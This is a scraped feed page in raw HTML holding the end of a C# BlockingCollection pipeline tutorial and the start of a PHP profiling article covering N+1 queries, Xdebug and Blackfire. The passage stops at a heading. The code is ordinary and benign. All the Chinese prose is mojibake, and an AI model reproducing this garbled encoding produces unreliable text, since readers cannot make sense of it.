                    <span class="hljs-built_in">string</span> data = <span class="hljs-string">$"åŸå§‹æ•°æ®<span class="hljs-subst">{i}</span>"</span>;
                    stage1.Add(data, cts.Token);
                    Console.WriteLine(<span class="hljs-string">$"é˜¶æ®µ1: äº§ç”Ÿ <span class="hljs-subst">{data}</span>"</span>);
                    Thread.Sleep(<span class="hljs-number">50</span>);
                }
                
                stage1.CompleteAdding();
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ1å®Œæˆ"</span>);
            }
            <span class="hljs-keyword">catch</span> (OperationCanceledException)
            {
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ1è¢«å–æ¶ˆ"</span>);
            }
        });
        
        <span class="hljs-comment">// é˜¶æ®µ2ï¼šæ•°æ®å¤„ç†</span>
        <span class="hljs-keyword">var</span> processorTask = Task.Run(() =&gt;
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> stage1.GetConsumingEnumerable(cts.Token))
                {
                    <span class="hljs-built_in">string</span> processed = <span class="hljs-string">$"å¤„ç†è¿‡çš„[<span class="hljs-subst">{item}</span>]"</span>;
                    stage2.Add(processed, cts.Token);
                    Console.WriteLine(<span class="hljs-string">$"é˜¶æ®µ2: å¤„ç† <span class="hljs-subst">{item}</span> -&gt; <span class="hljs-subst">{processed}</span>"</span>);
                    Thread.Sleep(<span class="hljs-number">100</span>);
                }
                
                stage2.CompleteAdding();
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ2å®Œæˆ"</span>);
            }
            <span class="hljs-keyword">catch</span> (OperationCanceledException)
            {
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ2è¢«å–æ¶ˆ"</span>);
            }
        });
        
        <span class="hljs-comment">// é˜¶æ®µ3ï¼šæ•°æ®è¾“å‡º</span>
        <span class="hljs-keyword">var</span> outputTask = Task.Run(() =&gt;
        {
            <span class="hljs-keyword">try</span>
            {
                <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> stage2.GetConsumingEnumerable(cts.Token))
                {
                    <span class="hljs-built_in">string</span> result = <span class="hljs-string">$"æœ€ç»ˆç»“æœ&lt;<span class="hljs-subst">{item}</span>&gt;"</span>;
                    stage3.Add(result, cts.Token);
                    Console.WriteLine(<span class="hljs-string">$"é˜¶æ®µ3: è¾“å‡º <span class="hljs-subst">{item}</span> -&gt; <span class="hljs-subst">{result}</span>"</span>);
                    Thread.Sleep(<span class="hljs-number">80</span>);
                }
                
                stage3.CompleteAdding();
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ3å®Œæˆ"</span>);
            }
            <span class="hljs-keyword">catch</span> (OperationCanceledException)
            {
                Console.WriteLine(<span class="hljs-string">"é˜¶æ®µ3è¢«å–æ¶ˆ"</span>);
            }
        });
        
        <span class="hljs-comment">// ç›‘æ§è¾“å‡º</span>
        <span class="hljs-keyword">var</span> monitorTask = Task.Run(() =&gt;
        {
            <span class="hljs-built_in">int</span> count = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> item <span class="hljs-keyword">in</span> stage3.GetConsumingEnumerable())
            {
                count++;
                Console.WriteLine(<span class="hljs-string">$"ç›‘æ§: æ”¶åˆ°ç¬¬<span class="hljs-subst">{count}</span>ä¸ªç»“æœ: <span class="hljs-subst">{item}</span>"</span>);
            }
            
            Console.WriteLine(<span class="hljs-string">$"ç›‘æ§: æ€»å…±æ”¶åˆ° <span class="hljs-subst">{count}</span> ä¸ªç»“æœ"</span>);
        });
        
        <span class="hljs-comment">// è¿è¡Œ5ç§’åå–æ¶ˆ</span>
        Task.Run(() =&gt;
        {
            Thread.Sleep(<span class="hljs-number">5000</span>);
            Console.WriteLine(<span class="hljs-string">"\næµæ°´çº¿è¿è¡Œ5ç§’ï¼Œå‘é€å–æ¶ˆä¿¡å·..."</span>);
            cts.Cancel();
        });
        
        <span class="hljs-keyword">try</span>
        {
            Task.WaitAll(sourceTask, processorTask, outputTask, monitorTask, <span class="hljs-number">10000</span>);
        }
        <span class="hljs-keyword">catch</span> (AggregateException ex)
        {
            Console.WriteLine(<span class="hljs-string">$"ä»»åŠ¡å¼‚å¸¸: <span class="hljs-subst">{ex.Flatten().Message}</span>"</span>);
        }
        
        Console.WriteLine(<span class="hljs-string">"æµæ°´çº¿è¿è¡Œç»“æŸ"</span>);
    }
}
</code></pre>
<h3 data-id="heading-15">ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-16">é€‚åˆåœºæ™¯</h4>
<ul>
<li>
<p><code>CPU</code> çº¿ç¨‹æ± ä»»åŠ¡</p>
</li>
<li>
<p>åå° <code>Worker</code></p>
</li>
<li>
<p>æ‰¹å¤„ç†ç³»ç»Ÿ</p>
</li>
<li>
<p><code>ETL</code> ç®¡é“</p>
</li>
<li>
<p>ä¼ ç»Ÿ <code>Producerâ€“Consumer</code></p>
</li>
</ul>
<h4 data-id="heading-17">ä¸é€‚åˆåœºæ™¯</h4>
<ul>
<li>
<p><code>async/await</code></p>
</li>
<li>
<p>é«˜ååä½å»¶è¿Ÿç½‘ç»œ IO</p>
</li>
<li>
<p><code>UI</code> çº¿ç¨‹</p>
</li>
<li>
<p>å®æ—¶ç³»ç»Ÿ</p>
</li>
</ul>
<h3 data-id="heading-18">æ€»ç»“</h3>
<ul>
<li>
<p><code>BlockingCollection&lt;T&gt;</code> æ˜¯ <code>.NET</code> å®˜æ–¹çš„é˜»å¡å¼çº¿ç¨‹å®‰å…¨é›†åˆï¼Œæ ¸å¿ƒé€‚é… â€œç”Ÿäº§è€… - æ¶ˆè´¹è€…â€ æ¨¡å‹ï¼›</p>
</li>
<li>
<p>æ ¸å¿ƒç‰¹æ€§ï¼šç©ºé›†åˆæ¶ˆè´¹é˜»å¡ã€æ»¡é›†åˆç”Ÿäº§é˜»å¡ï¼Œæ”¯æŒè¾¹ç•Œé™åˆ¶ã€å–æ¶ˆæ“ä½œã€è‡ªå®šä¹‰åº•å±‚å­˜å‚¨ï¼›</p>
</li>
<li>
<p>æ ¸å¿ƒ APIï¼š<code>Add()</code>ï¼ˆç”Ÿäº§ï¼‰ã€<code>Take()</code>ï¼ˆæ¶ˆè´¹ï¼‰ã€<code>CompleteAdding()</code>ï¼ˆæ ‡è®°ç”Ÿäº§å®Œæˆï¼‰ã€<code>GetConsumingEnumerable()</code>ï¼ˆéå†æ¶ˆè´¹ï¼‰ï¼›</p>
</li>
<li>
<p>å…³é”®å‘ç‚¹ï¼šå¿…é¡»è°ƒç”¨ <code>CompleteAdding()</code> é¿å…æ¶ˆè´¹è€…æ°¸ä¹…é˜»å¡ï¼Œä½¿ç”¨åéœ€ <code>Dispose</code> é‡Šæ”¾èµ„æºï¼›</p>
</li>
<li>
<p>é€‚ç”¨åœºæ™¯ï¼šæ—¥å¿—æ”¶é›†ã€ä»»åŠ¡é˜Ÿåˆ—ã€æ¶ˆæ¯åˆ†å‘ã€å¤šçº¿ç¨‹æ•°æ®å¤„ç†ç­‰ç”Ÿäº§è€… - æ¶ˆè´¹è€…åœºæ™¯ï¼Œä¼˜å…ˆä½¿ç”¨è€Œéæ‰‹åŠ¨å®ç°ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§]]></title>    <link>https://juejin.cn/post/7596906923892817930</link>    <guid>https://juejin.cn/post/7596906923892817930</guid>    <pubDate>2026-01-19T23:44:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596906923892817930" data-draft-id="7596904122866057267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§"/> <meta itemprop="keywords" content="åç«¯,PHP"/> <meta itemprop="datePublished" content="2026-01-19T23:44:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:44:14.000Z" title="Mon Jan 19 2026 23:44:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§</h2>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆ PHP åº”ç”¨éœ€è¦æ€§èƒ½åˆ†æ</h3>
<p>ä½œä¸º PHP å¼€å‘è€…ï¼Œä½ ç»å¸¸è¦æ„å»ºå¯æ‰©å±•ã€èƒ½æ”¯æ’‘é«˜å¹¶å‘ã€æ€§èƒ½ç¨³å®šçš„åº”ç”¨ã€‚ä½†å½“ç³»ç»Ÿå¤æ‚åº¦æˆ–æµé‡ä¸Šæ¥åï¼Œæ€§èƒ½ç“¶é¢ˆå°±ä¼šå‡ºç°ï¼Œè€Œä¸”è¿™äº›é—®é¢˜åœ¨å¼€å‘ç”šè‡³æµ‹è¯•é˜¶æ®µå¾€å¾€çœ‹ä¸åˆ°ã€‚</p>
<p>æ€§èƒ½åˆ†æï¼ˆprofilingï¼‰èƒ½è®©ä½ ä»çŒœæµ‹å›åˆ°æ•°æ®ã€‚å®ƒå¸®ä½ è¡¡é‡åº”ç”¨å„ä¸ªç¯èŠ‚çš„æ€§èƒ½ï¼Œç²¾å‡†æ‰¾å‡ºä½æ•ˆç‚¹ã€‚ä¸å…¶å‡­æ„Ÿè§‰ä¼˜åŒ–ï¼Œä¸å¦‚ç›´æ¥çœ‹æ•°æ®å‘Šè¯‰ä½ å“ªé‡Œæ…¢â€”â€”æ•°æ®åº“æŸ¥è¯¢ã€å†…å­˜å ç”¨è¿˜æ˜¯å‡½æ•°è°ƒç”¨ã€‚</p>
<p>æœ¬æ–‡ä¼šä»‹ç»å¦‚ä½•å¯¹ PHP åº”ç”¨åšæ€§èƒ½åˆ†æã€å¸¸è§æ€§èƒ½é—®é¢˜ã€é€‚ç”¨å·¥å…·ï¼Œä»¥åŠå¦‚ä½•ä¸ºä¿®å¤æ’ä¼˜å…ˆçº§ã€‚
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fprofiling-php-applications-from-assumptions-to-data" target="_blank" title="https://catchadmin.com/post/2026-01/profiling-php-applications-from-assumptions-to-data" ref="nofollow noopener noreferrer">åŸæ–‡ PHP åº”ç”¨æ€§èƒ½åˆ†æ ä»å‡è®¾åˆ°æ•°æ®ä¸ä¿®å¤ä¼˜å…ˆçº§</a></p>
<h3 data-id="heading-2">æ€§èƒ½åˆ†æåŸºç¡€ï¼šä½ éœ€è¦çŸ¥é“ä»€ä¹ˆ</h3>
<p>æ€§èƒ½åˆ†æçš„æ ¸å¿ƒæ˜¯æµ‹é‡ä¸åˆ†æåº”ç”¨çš„èµ„æºæ¶ˆè€—ï¼Œä¾‹å¦‚ CPUã€å†…å­˜å’Œæ‰§è¡Œæ—¶é—´ï¼Œå¸®åŠ©ä½ æ‰¾å‡ºçœŸæ­£éœ€è¦ä¼˜åŒ–çš„â€œçƒ­åŒºâ€ã€‚</p>
<p>æ€§èƒ½åˆ†ææ•°æ®é€šå¸¸èƒ½å›ç­”è¿™äº›é—®é¢˜ï¼š</p>
<ul>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­ç”¨äº†å¤šå°‘å†…å­˜ï¼Ÿ</li>
<li><strong>æ‰§è¡Œæ—¶é—´</strong>ï¼šå“ªäº›å‡½æ•°æˆ–æ¨¡å—è€—æ—¶æœ€é•¿ï¼Ÿ</li>
<li><strong>æ•°æ®åº“æŸ¥è¯¢æ€§èƒ½</strong>ï¼šå“ªäº›æŸ¥è¯¢æœ€æ…¢ï¼Ÿæ€»å…±æ‰§è¡Œäº†å¤šå°‘æ¬¡ï¼Ÿ</li>
<li><strong>CPU ä½¿ç”¨</strong>ï¼šå“ªäº›å‡½æ•°æ¶ˆè€—äº†æœ€å¤š CPU è®¡ç®—ï¼Ÿ</li>
</ul>
<p>é€šè¿‡è¿™äº›æŒ‡æ ‡ï¼Œä½ å°±èƒ½ç²¾å‡†å®šä½æ€§èƒ½é—®é¢˜å¹¶ä¼˜åŒ–ä»£ç ã€‚</p>
<h3 data-id="heading-3">PHP åº”ç”¨å¸¸è§æ€§èƒ½é—®é¢˜</h3>
<p>åšæ€§èƒ½åˆ†ææ—¶ï¼Œä¸‹é¢è¿™äº›é—®é¢˜æœ€å¸¸å‡ºç°ã€‚</p>
<h4 data-id="heading-4">è¿‡å¤šçš„æ•°æ®åº“æŸ¥è¯¢</h4>
<p>å¦‚æœåº”ç”¨é¢‘ç¹ä¸æ•°æ®åº“äº¤äº’ï¼Œå“åº”å°±å¯èƒ½å˜æ…¢ï¼Œå¸¸è§åŸå› åŒ…æ‹¬ï¼š</p>
<ul>
<li>æŸ¥è¯¢å†™å¾—ä½æ•ˆï¼ˆå–äº†è¿‡å¤šæ•°æ®ã€ç¼ºå°‘ç´¢å¼•ï¼‰</li>
<li>åœ¨å¾ªç¯é‡Œæ‰§è¡ŒæŸ¥è¯¢ï¼Œå‡ºç° N+1 é—®é¢˜</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$posts</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM posts"</span>);
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
    <span class="hljs-comment">// display posts and comments</span>
}
</code></pre>
<p>å¦‚æœæœ‰ 100 ç¯‡æ–‡ç« ï¼Œè¿™æ®µä»£ç ä¼šè·‘ 101 æ¬¡æŸ¥è¯¢ï¼ˆ1 æ¬¡å–æ–‡ç«  + 100 æ¬¡å–è¯„è®ºï¼‰ï¼Œæ•ˆç‡å¾ˆä½ã€‚</p>
<h4 data-id="heading-5">ä½æ•ˆçš„å¾ªç¯</h4>
<p>æœ‰äº›ä»£ç åœ¨å¤§æ•°æ®é›†ä¸Šä½¿ç”¨åµŒå¥—å¾ªç¯æˆ–æ˜‚è´µæ“ä½œï¼Œæ‰§è¡Œæ—¶é—´ä¼šè¢«æ”¾å¤§ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
    <span class="hljs-comment">// Performing some heavy operation</span>
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">complexOperation</span>(<span class="hljs-variable">$item</span>);
}
</code></pre>
<p>Profiling èƒ½å¸®ä½ è¯†åˆ«è¿™äº›å¾ªç¯å¹¶è¡¡é‡è€—æ—¶ï¼Œç»™ä½ ä¼˜åŒ–çš„æŠ“æ‰‹ã€‚</p>
<h4 data-id="heading-6">å†…å­˜æ³„æ¼</h4>
<p>å†…å­˜æ³„æ¼æŒ‡å¯¹è±¡æˆ–å˜é‡å ç”¨è¿‡å¤šå†…å­˜ä¸”æ— æ³•åŠæ—¶é‡Šæ”¾ã€‚æ•°æ®é‡å¤§æ—¶ï¼Œå†…å­˜ä¼šæŒç»­å¢é•¿ï¼Œå¯¼è‡´æ€§èƒ½ä¸‹é™ç”šè‡³å´©æºƒã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) {
    <span class="hljs-variable">$rows</span>[] = <span class="hljs-variable">$row</span>;
}
</code></pre>
<p>å¦‚æœ <code>$rows</code> æ— é™å¢é•¿ï¼Œå°±å¯èƒ½è€—å°½å†…å­˜ã€‚Profiling èƒ½å¸®åŠ©ä½ è¯†åˆ«å¹¶ä¼˜åŒ–è¿™ç±»é—®é¢˜ã€‚</p>
<h4 data-id="heading-7">ç¼“å­˜ç­–ç•¥ä¸ä½³</h4>
<p>ç¼“å­˜æ˜¯æé€Ÿçš„åˆ©å™¨ï¼Œä½†ç­–ç•¥ä¸å½“ä¹Ÿä¼šæ‹–æ…¢ç³»ç»Ÿï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>æ²¡æœ‰ç¼“å­˜æ•°æ®ï¼ˆæ¯æ¬¡éƒ½ä»æ•°æ®åº“é‡æ–°æŸ¥è¯¢ï¼‰</li>
<li>ç¼“å­˜å¤±æ•ˆç­–ç•¥æ··ä¹±</li>
</ul>
<h3 data-id="heading-8">PHP åº”ç”¨æ€§èƒ½åˆ†æçš„æ–¹æ³•</h3>
<p>ä¸‹é¢æ˜¯å‡ ç§å¸¸è§ä¸”å®ç”¨çš„æ€§èƒ½åˆ†ææ–¹æ³•ä¸å·¥å…·ã€‚</p>
<h4 data-id="heading-9">ä½¿ç”¨ microtime() æ‰‹åŠ¨æ€§èƒ½åˆ†æ</h4>
<p>å¯¹äºå°èŒƒå›´æ€§èƒ½æµ‹è¯•ï¼Œå¯ä»¥ç”¨ PHP å†…ç½®çš„ <code>microtime()</code> è®°å½•æ‰§è¡Œæ—¶é—´ã€‚</p>
<p>ç¤ºä¾‹ï¼šä½¿ç”¨ microtime() è¿›è¡ŒåŸºç¡€æ€§èƒ½åˆ†æ</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$start_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-comment">// Simulating some code execution</span>
<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// Sleep for 2 seconds</span>
<span class="hljs-variable">$end_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-variable">$execution_time</span> = <span class="hljs-variable">$end_time</span> - <span class="hljs-variable">$start_time</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Execution time: "</span> . <span class="hljs-variable">$execution_time</span> . <span class="hljs-string">" seconds"</span>;
</code></pre>
<p>è¿™ç§æ–¹æ³•ç®€å•ï¼Œä½†ä¸é€‚åˆå¤æ‚åº”ç”¨ï¼Œæ›´é€‚åˆå°ç‰‡æ®µæ€§èƒ½æ£€æŸ¥ã€‚</p>
<h4 data-id="heading-10">Xdebugï¼šå¼ºå¤§çš„æ€§èƒ½åˆ†æå·¥å…·</h4>
<p>Xdebug æ˜¯æœ€å¸¸ç”¨çš„ PHP profiling å·¥å…·ä¹‹ä¸€ï¼Œå¯è·Ÿè¸ªå‡½æ•°è°ƒç”¨ã€å†…å­˜å ç”¨å’Œæ‰§è¡Œæ—¶é—´ã€‚å®ƒä¼šç”Ÿæˆ cachegrind æ–‡ä»¶ï¼Œå¹¶å¯ç”¨ KCacheGrind æˆ– QCacheGrind å¯è§†åŒ–åˆ†æã€‚</p>
<p>é…ç½® Xdebug æ€§èƒ½åˆ†æï¼š</p>
<ol>
<li>å®‰è£… Xdebugã€‚</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install php-xdebug
</code></pre>
<ol start="2">
<li>åœ¨ <code>php.ini</code> ä¸­å¼€å¯ profilingï¼š</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">xdebug.profiler_enable</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">xdebug.profiler_output_dir</span> = <span class="hljs-string">"/var/tmp/xdebug_profiles"</span>
</code></pre>
<ol start="3">
<li>è¿è¡Œåº”ç”¨ï¼Œç”Ÿæˆ cachegrind æ–‡ä»¶ã€‚</li>
<li>ç”¨ KCacheGrind æˆ– QCacheGrind å¯è§†åŒ–åˆ†æã€‚</li>
</ol>
<p>ç¤ºä¾‹ï¼šXdebug æ€§èƒ½åˆ†æè¾“å‡º</p>
<pre><code class="hljs language-text" lang="text">Function Name     Calls  Time   Memory
--------------------------------------
myFunction()       10    0.005  512KB
databaseQuery()    15    0.020  1MB
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œ<code>databaseQuery()</code> è€—æ—¶æ›´é«˜ï¼Œè¯´æ˜æ•°æ®åº“å±‚å¯èƒ½éœ€è¦è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
<h4 data-id="heading-11">Blackfireï¼šç°ä»£åŒ–æ€§èƒ½åˆ†ææ–¹æ¡ˆ</h4>
<p>Blackfire æ›´ç°ä»£ã€ä½“éªŒå‹å¥½ï¼Œæä¾›ç«ç„°å›¾ï¼ˆflame graphï¼‰ï¼Œèƒ½ç›´è§‚çœ‹åˆ° CPU å’Œå†…å­˜è€—æ—¶ã€‚</p>
<p>Blackfire çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>è‡ªåŠ¨æ€§èƒ½åˆ†æï¼šæ¯æ¬¡ HTTP è¯·æ±‚éƒ½å¯è‡ªåŠ¨åˆ†æ</li>
<li>å¯¹æ¯”åˆ†æï¼šæ”¯æŒå¯¹æ¯”ä¼˜åŒ–å‰åçš„æ€§èƒ½</li>
<li>ç«ç„°å›¾ï¼ˆflame graphï¼‰ï¼šå¯è§†åŒ– CPU ä¸å†…å­˜æ¶ˆè€—</li>
</ul>
<p>ä½¿ç”¨ Blackfireï¼š</p>
<ol>
<li>åœ¨ Blackfire.io æ³¨å†Œå¹¶å®‰è£… Blackfire Agent ä¸ Profilerã€‚</li>
<li>åœ¨åº”ç”¨é‡Œå¯ç”¨æ€§èƒ½åˆ†æï¼š</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">Blackfire\Profiler</span>::<span class="hljs-title function_ invoke__">enable</span>();
</code></pre>
<ol start="3">
<li>æ‰§è¡Œæ€§èƒ½åˆ†æåï¼ŒæŠ¥å‘Šä¸­ä¼šä»¥ç«ç„°å›¾å±•ç¤ºä»£ç è€—æ—¶åˆ†å¸ƒã€‚</li>
</ol>
<h3 data-id="heading-12">è§£ææ€§èƒ½åˆ†ææ•°æ®ï¼šæŠŠæ´å¯Ÿå˜æˆè¡ŒåŠ¨</h3>
<p>æ‹¿åˆ°æ€§èƒ½åˆ†ææ•°æ®åï¼Œå…³é”®æ˜¯åˆ¤æ–­å“ªäº›åœ°æ–¹è€—èµ„æºæœ€å¤šï¼Œå†å†³å®šä¼˜åŒ–ä¼˜å…ˆçº§ã€‚</p>
<h4 data-id="heading-13">æ…¢å‡½æ•°</h4>
